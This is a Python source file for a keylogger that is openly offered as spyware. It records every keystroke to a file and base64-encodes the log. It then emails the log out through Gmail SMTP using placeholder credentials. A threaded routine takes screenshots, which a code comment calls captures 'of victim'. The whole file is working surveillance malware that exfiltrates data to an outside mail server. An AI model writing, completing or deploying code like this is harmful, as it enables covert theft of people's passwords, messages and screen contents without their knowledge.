'''

A simple python keylogger built to log key strokes and remotely
send base64 encoded file to the specified email address.
It also has the added feature to caputre screenshots on a different
thread simultaneously while keylogger is running in the main.

Currently this is a command-line application tested on Linux environment

python version :- 3.9.7

install pynput:-
pip install pynput

install pillow for image processing:-
pip install pillow

'''


#importing necessary libraries and modules 
from pynput import keyboard
import base64
import smtplib, ssl
from PIL import ImageGrab
import datetime
import os
import time
import threading


substitute ={

	'Key.enter': '[ENTER]\n',
	'Key.backspace': '[BACKSPACE]', 
	'Key.space': ' ',
	'Key.alt': '[ALT]',
	'Key.tab': '[TAB]',
	'Key.delete': '[DEL]',
	'Key.ctrl': '[CTRL]',
	'Key.left': '[LEFT ARROW]', 
	'Key.right': '[RIGHT ARROW]', 
	'Key.shift': '[SHIFT]',
	'Key.caps_lock': '[CAPS LK]',
	'Key.cmd':'[WINDOWS KEY]',
	'Key.print_screen': '[PRNT SCR]',
	'Key.esc':'[ESC]'

	}


#send file to the specified email
def send_log():

	#port for ssl
	port=465 

	#change email credentials as per requirement
	sender_mail = "........"
	password = "........."
	receiver_email = "........................"

	# Create a secure SSL context
	context = ssl.create_default_context()

	message = encode("logs.txt")

	print("[+] the logs is encoded and is getting ready to send ......")

	with smtplib.SMTP_SSL("smtp.gmail.com",port,context=context) as server:
		server.login(sender_mail,password)
		print("[+] the log file is now being sent....")

		server.sendmail(sender_mail,receiver_email,message)
		print("[+] the logs has been sent....")


#base64 encode the file
def encode(filename):
	with open(filename,"r") as file:
		data = file.read()
		encoded = base64.b64encode(data.encode())

	return encoded.decode()


def on_press(key):
	with open("logs.txt","a") as logs:
		try:
			logs.write(key.char)
		except AttributeError:
			logs.write(substitute[str(key)]+" ")

def on_release(key):
	#user can make a timer function to send log files in the specified interval

	#for debugging and testing locally, the following code is used
	if key==keyboard.Key.esc:
		print("\n")
		print("[+] the listener will stop working")
		
		send_log()

		print("[-] the program will close in T minus 5 seconds...")
		return False


with keyboard.Listener(on_press=on_press,on_release=on_release) as listener:
	#close the program after 5 sec after pressing esc key
	listener.join(5) 


# <------ code for capturing screenshot of victim -------------------->


def screenshot():

	#make a directory to store screenshots
    try:
        os.mkdir("screenshots")
    except FileExistsError:
        pass

    #capture 6 screenshots within timeperiod
    #modify to increase screenshots volume
    for i in range(5):
        time.sleep(3)
        filepath = "screenshots/"+str(datetime.datetime.now())+".png"
        screenshot = ImageGrab.grab()
        screenshot.save(filepath)

#start a thread to begin along with keylogger section
#rearrange sections of code as per convenience
proc1 = threading.Thread(target=screenshot)

proc1.start()





